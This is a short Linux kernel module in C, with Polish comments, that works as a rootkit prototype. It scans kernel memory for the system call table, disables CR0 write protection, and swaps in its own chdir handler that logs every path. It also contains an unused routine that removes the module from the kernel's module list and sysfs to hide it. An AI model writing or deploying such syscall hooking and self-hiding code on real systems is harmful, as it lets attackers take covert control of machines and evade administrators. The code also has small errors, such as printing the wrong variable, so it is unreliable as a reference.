#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/list.h>
#include <linux/unistd.h>
#include <linux/kobject.h>
#include <linux/init.h>

 /* start of 64-bit kernel space is 0xffffffff80000000 */
#define START_MEM PAGE_OFFSET
#define END_MEM   ULLONG_MAX /* end of 64-bit kernel */

unsigned long long **syscall_tab;
unsigned long long orig_cr0;
asmlinkage long long (*orig_chdir)(const char __user *filename); 

/* funkcja do podmiany */
asmlinkage long long my_chdir(const char __user *filename)
{
  long long ret;
  ret = orig_chdir(filename);
  printk("Dziala %s", filename);
  return ret;
}

/* funkcja ukrywająca moduł- tutaj jeszcze nieużyta, ze względu na randomowe działanie modułu */
static void hide(void) 
{
  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
}

/* funkcja poszukująca syscall_table */
static unsigned long long **find(void) {
    unsigned long long **sctable;
    unsigned long long i = START_MEM;

    while (i < END_MEM) {
        sctable = (unsigned long long **) i;

        if ( sctable[__NR_close] == (unsigned long long *) sys_close) {
            printk("syscall_tab %lx", syscall_tab);
            return &sctable[0];
        }
        i += sizeof(void *);
    }

    return NULL;
}

static int __init init(void)
{
  printk("hello--------------------------");
 if(!(syscall_tab = find())) {
    return 0;
  }
  orig_chdir = (void *) syscall_tab[__NR_chdir];
  orig_cr0 = read_cr0();
  write_cr0(orig_cr0 & ~0x10000); /* wyłączenie ochrony stron pamięci */
  printk("write_cr0");
  syscall_tab[__NR_chdir] = (unsigned long long*) my_chdir;  /* podmiana wywołania systemowego */
  printk("po podmiance");
  write_cr0(orig_cr0); /* włączenie ochrony stron pamięci */
  return 0;
}

static void __exit exitt(void)
{
  write_cr0(orig_cr0 & (~0x10000));
  syscall_tab[__NR_chdir] = (unsigned long long*) orig_chdir; /* przywrócenie pierwotnego wywołania systemowego */
  write_cr0(orig_cr0);
}
module_init(init);
module_exit(exitt);
MODULE_LICENSE("GPL");
